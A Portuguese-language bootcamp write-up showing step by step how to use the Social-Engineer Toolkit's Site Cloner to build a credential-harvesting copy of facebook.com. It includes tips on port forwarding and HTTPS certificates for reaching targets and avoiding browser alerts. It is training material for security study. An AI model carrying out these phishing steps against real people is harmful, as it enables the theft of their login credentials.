# Social-Engineer Toolkit (SET) Credential Harvester

## Visão Geral
Este documento descreve o processo de configuração e execução de um ataque de *Credential Harvester* usando o Social-Engineer Toolkit (SET). Este método clona um site legítimo para capturar credenciais inseridas por usuários.

**Aviso**: Este guia é para fins educacionais e deve ser usado exclusivamente em ambientes controlados e com autorização explícita. O uso não autorizado pode violar leis locais e internacionais.

---

## Requisitos

- **Sistema operacional:** Linux (preferencialmente Kali ou Ubuntu)
- **Social-Engineer Toolkit (SET):** Instalado e atualizado para a versão mais recente
- **Conexão com a Internet:** Necessária para clonar sites
- **Permissões de superusuário:** Algumas etapas requerem privilégios de root

---

## Passo a Passo

1. Inicialização do Social-Engineer Toolkit:
   Abra o terminal e execute:
   ```bash
   sudo setoolkit
   ```
   Será exibida uma tela inicial com opções de menu.
   
![Captura de tela 2024-12-06 095455](https://github.com/user-attachments/assets/59f40f93-2e20-4e21-b6d6-8384ef386e18)

3. Seleção do Vetor de Ataque:
   No menu principal do SET, escolha:
   ```plaintext
   2) Website Attack Vectors
   ```
   Este módulo utiliza múltiplos métodos baseados na web para comprometer alvos.

4. Escolha do Método de Ataque:
   No próximo menu, selecione:
   ```plaintext
   3) Credential Harvester Attack Method
   ```
   Este método clona um site com campos de login para capturar credenciais inseridas pelos usuários.

5. Configuração do Ataque:
   Escolha a opção:
   ```plaintext
   2) Site Cloner
   ```
   Esta opção clona o site escolhido, preservando a funcionalidade de login.

6. Configuração do IP para POST:
   O SET solicitará o IP para receber os dados capturados. Digite:
   ```plaintext
   IP address for the POST back in Harvester/Tabnabbing [192.168.xxx.xxx]:
   ```
   **Nota:** Caso esteja operando fora de uma rede local, configure o *port forwarding* e use o IP público.

7. Inserção da URL do Site Alvo:
   Insira o endereço do site que deseja clonar. Exemplo:
   ```plaintext
   Enter the url to clone: www.facebook.com
   ```
   O SET irá clonar a página de login fornecida e preparar o servidor.

8. Execução do Ataque:
   O SET cria uma réplica do site e inicia um servidor.  
   A página clonada ficará disponível no endereço IP configurado na etapa 5.
   
![Captura de tela 2024-12-06 100030](https://github.com/user-attachments/assets/37c2ad13-2cfe-4ed3-ab22-b78eb90d638a)


---

## Observações Importantes

- Certifique-se de que o dispositivo alvo consegue acessar o IP configurado.
- Se estiver usando HTTPS, considere a necessidade de certificados válidos para evitar alertas no navegador.
- Execute testes apenas em ambientes controlados e com permissão explícita para evitar problemas legais.

---

## Resultados
As credenciais inseridas no site clonado serão capturadas e salvas em arquivos de log no diretório do SET.

![passwd](https://github.com/user-attachments/assets/63341764-1345-41a3-9ed9-8fbeadc7ff31)


---

## Considerações Finais
Este guia demonstrou como configurar e executar um ataque básico usando o SET.  
**Use esta ferramenta de forma ética e responsável, respeitando as leis locais e internacionais.**

Santander BootCamp - CyberSecurity
